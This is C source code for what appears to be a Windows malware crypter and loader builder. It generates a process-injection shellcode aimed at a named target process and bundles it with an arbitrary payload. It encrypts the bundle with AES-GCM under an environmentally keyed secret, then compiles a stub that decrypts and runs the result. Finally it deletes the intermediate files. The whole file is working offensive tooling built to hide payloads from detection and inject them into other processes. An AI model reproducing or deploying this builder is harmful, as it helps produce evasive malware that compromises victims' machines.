#include <stdbool.h>
#include <stdio.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <string.h>
#include <stdint.h>
#include <winsock2.h>
#include <Windows.h>

#define AES_KEYLEN 32
#define GCM_IV_LEN 12
#define GCM_TAG_LEN 16

#define print(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)


unsigned char *aes_gcm_encrypt(
    unsigned char *key,
    unsigned char *plaintext,
    int plaintext_len,
    int *out_len)
{
    EVP_CIPHER_CTX *ctx;
    int len;
    int ciphertext_len;

    unsigned char iv[GCM_IV_LEN];
    unsigned char tag[GCM_TAG_LEN];

    unsigned char *out =
        malloc(GCM_IV_LEN + plaintext_len + GCM_TAG_LEN);
    if (!out) return NULL;

    if (!RAND_bytes(iv, GCM_IV_LEN)) {
        free(out);
        return NULL;
    }

    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { free(out); return NULL; }

    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, GCM_IV_LEN, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);

    memcpy(out, iv, GCM_IV_LEN);

    EVP_EncryptUpdate(ctx,
        out + GCM_IV_LEN,
        &len,
        plaintext,
        plaintext_len);

    ciphertext_len = len;

    EVP_EncryptFinal_ex(ctx,
        out + GCM_IV_LEN + len,
        &len);

    ciphertext_len += len;

    EVP_CIPHER_CTX_ctrl(ctx,
        EVP_CTRL_GCM_GET_TAG,
        GCM_TAG_LEN,
        tag);

    memcpy(out + GCM_IV_LEN + ciphertext_len,
           tag,
           GCM_TAG_LEN);

    *out_len = GCM_IV_LEN + ciphertext_len + GCM_TAG_LEN;

    EVP_CIPHER_CTX_free(ctx);
    return out;
}

unsigned char *read_file(const char *path, int *size_out)
{
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    unsigned char *buf = malloc(size);
    if (!buf) { fclose(f); return NULL; }

    fread(buf, 1, size, f);
    fclose(f);

    *size_out = size;
    return buf;
}

uint32_t wcharHash(const wchar_t* str) {
    uint32_t hash = 0;
    uint32_t multiplier = 31;
    while (*str != L'\0') {
        hash = hash * multiplier + *str;
        str++;
    }
    return hash;
}

void generateInjector(const char *injector_type_bin, const char *injector_type_proto, const char *tProc) {
    
	print("Generating %s injector for %s", injector_type_bin, tProc);

    // why
    size_t size = mbstowcs(NULL, tProc, 0);
    if (size == (size_t)-1) return;
    wchar_t* wstr = malloc((size + 1) * sizeof(wchar_t));
    wchar_t* wstr_orig = wstr;
    mbstowcs(wstr, tProc, size + 1);

	uint32_t h = wcharHash(wstr);
	free(wstr_orig);

	FILE* f = fopen("injector.c", "wb");
	if (!f) return;

	fprintf(f, "#include \"injector.h\"\n\n");
	fprintf(f, "#pragma code_seg(\".inject\")\n\n");
	fprintf(f, "int injector(CONST PBYTE payload, CONST SIZE_T payloadsize) { \n\n");
	fprintf(f, "    int sProc           = %u;\n", h);


	FILE* base = fopen(injector_type_proto, "r");
	char line[4096];
	while (fgets(line, sizeof(line), base))
		fputs(line, f);
	fclose(base);
	fclose(f);

    
	print("Compiling injector...");
    system("cl.exe /c /GS- /O2 /Tc injector.c >NUL 2>NUL");
	print("Linking injector...");
    system("link.exe /nologo /IGNORE:4108 /ENTRY:injector /NODEFAULTLIB /SUBSYSTEM:CONSOLE /FIXED /ALIGN:16 /SECTION:.inject,ER injector.obj /OUT:injector.exe");
    
    // not beautiful but it works 
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "python extract_shellcode.py \"%s\"", injector_type_bin);
    system(cmd);

    return;
}

unsigned char *encrypt_payload(
    unsigned char *key,
    char *infile,
    bool is_shellcode,
	char* injector_type,
    int *out_len)
{
    unsigned char *payload;
    int payload_len;
	unsigned char* injector;
	int injector_len;

    if (is_shellcode) {
        payload = (unsigned char*)infile;
        payload_len = strlen(infile);
    } else {
        payload = read_file(infile, &payload_len);
        if (!payload) return NULL;
    }

	injector = read_file(injector_type, &injector_len);

	int total_len = 8 + injector_len + payload_len;

	unsigned char* composite = malloc(total_len);
    if (!composite) return NULL;

	int inj_be = htonl(injector_len);
    int pay_be = htonl(payload_len);

	memcpy(composite, &inj_be, 4);
	memcpy(composite + 4, &pay_be, 4);

    memcpy(composite + 8, injector, injector_len);
	memcpy(composite + 8 + injector_len, payload, payload_len);

    printf("[*] Payload Key: ");
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
		printf("%02x", key[i]);
    printf("\n");

    unsigned char *blob =
        aes_gcm_encrypt(key,
                        composite,
                        total_len,
                        out_len);

    if (!is_shellcode)
        free(payload);

    return blob;
}

void generate_stub(
    unsigned char *blob,
    int blob_len,
    char *env_keytype,
    char *filename,
    size_t flen)
{
    FILE *f = fopen("stub.c", "w");
    if (!f) return;

    FILE *base = fopen("stub_template", "r");
    char line[4096];
    while (fgets(line, sizeof(line), base))
        fputs(line, f);
    fclose(base);

    fprintf(f, "\n");

    FILE *t = fopen(env_keytype, "r");
    while (fgets(line, sizeof(line), t))
        fputs(line, f);
    fclose(t);

    fprintf(f, "\nint main(){\n");
    fprintf(f, "    unsigned char payload[] = {");
    for (int i = 0; i < blob_len; i++)
        fprintf(f, "0x%02x,", blob[i]);
    fprintf(f, "};\n");
    fprintf(f, "    unsigned int payload_len = %d;\n", blob_len);
    fprintf(f, "    unsigned char key[32];\n");

    if (strstr(env_keytype, "filename")) {
		fprintf(f, "    char fkey[] = {");
		for (int i = 0; i < flen; i++)
			fprintf(f, " 0x%02x,", (unsigned char)filename[i]);
		fprintf(f, " 0x00 };\n");
        fprintf(f, "    unsigned int fLen = %d;\n", flen);
		fprintf(f, "    if (!getFileExists(key, fkey, fLen)) return 1;\n");
    }else fprintf(f, "    if (!getKey(key)) return 1;\n");

    
    fprintf(f, "    int pt_len = 0;\n");
    fprintf(f, "    unsigned char *pt = decrypt(key, payload, payload_len, &pt_len);\n");
    fprintf(f, "    if (!pt) return 1;\n");
    fprintf(f, "    executeComposite(pt, pt_len);\n");
    fprintf(f, "    return 0;\n");
    fprintf(f, "}\n");

    fclose(f);
}

int main(int argc, char *argv[])
{
    if (argc < 6) {
		printf("Usage: %s <env_keytype> <env_value> <injector_type> <target_process> <input_file>\n", argv[0]);
        return 1;
    }
    char *env_keytype = argv[1];
    char *env_value = argv[2];
	char *injector_type = argv[3];
	char* tProc = argv[4];
    char *infile = argv[5];

    char env_keytype_buf[256];
    char injector_type_bin_buf[256];
	char injector_type_proto_buf[256];


    strncpy(env_keytype_buf, argv[1], sizeof(env_keytype_buf) - 10); // leave space for "_template"
    env_keytype_buf[sizeof(env_keytype_buf) - 10] = '\0';
    strcat(env_keytype_buf, "_template");

    strncpy(injector_type_bin_buf, argv[3], sizeof(injector_type_bin_buf) - 10);
    injector_type_bin_buf[sizeof(injector_type_bin_buf) - 10] = '\0';
    strcat(injector_type_bin_buf, "-inject.bin");

	strncpy(injector_type_proto_buf, argv[3], sizeof(injector_type_proto_buf) - 10);
	injector_type_proto_buf[sizeof(injector_type_proto_buf) - 10] = '\0';
	strcat(injector_type_proto_buf, "-inject-proto");

    
	print("%s", env_keytype_buf);
	print("%s", env_value);
    print("%s", injector_type_bin_buf);
	print("%s", injector_type_proto_buf);
	print("%s", infile);
    
    generateInjector(injector_type_bin_buf, injector_type_proto_buf, tProc);
    
    

    unsigned char key[SHA256_DIGEST_LENGTH];

    SHA256((unsigned char*)env_value, strlen(env_value), key);

    char xorkey[256];
    char fname[256];
    size_t len = strlen(env_value);
    
    if (strcmp(env_keytype, "filename") == 0) {
        print("WARNING: Reversing this keytype is trivial, if you care about that, use in conjunction with other types, or not at all.");
        // Generate and create the xor key and filename bytes that will be passed to the stub.
        for (int i = 0; i < sizeof(fname); i++)
            xorkey[i] = 'a' + i;
        for (size_t i = 0; i < len && i < sizeof(fname); i++)
            fname[i] = env_value[i] ^ xorkey[i];
        fname[len] = '\0';

        printf("[*] Filename XOR Key: ");
        for (int i = 0; i < len; i++)
            printf("%02x", (unsigned char)fname[i]);
		printf("\n");
    }


    int blob_len;

    unsigned char *blob = encrypt_payload(key, infile, false, injector_type_bin_buf, &blob_len);

    if (!blob) {
        printf("Encryption failed\n");
        return 1;
    }
	print("Generating stub...");
    generate_stub(blob, blob_len, env_keytype_buf, fname, len);
    free(blob);
    
	print("Compiling stub...");
	system("cl.exe /nologo /MT stub.c /I \"C:\\Program Files\\OpenSSL-Win64\\include\" /link /LIBPATH:\"C:\\Program Files\\OpenSSL-Win64\\lib\\VC\\x64\\MT\" libcrypto_static.lib libssl_static.lib advapi32.lib user32.lib crypt32.lib ws2_32.lib gdi32.lib >NUL 2>NUL");
    //system("gcc -s -o out wrapped.c -lcrypto");
	print("Done!");
    system("del stub.c,stub.obj,injector.c,injector.obj,injector.exe,*.bin");

    return 0;
}
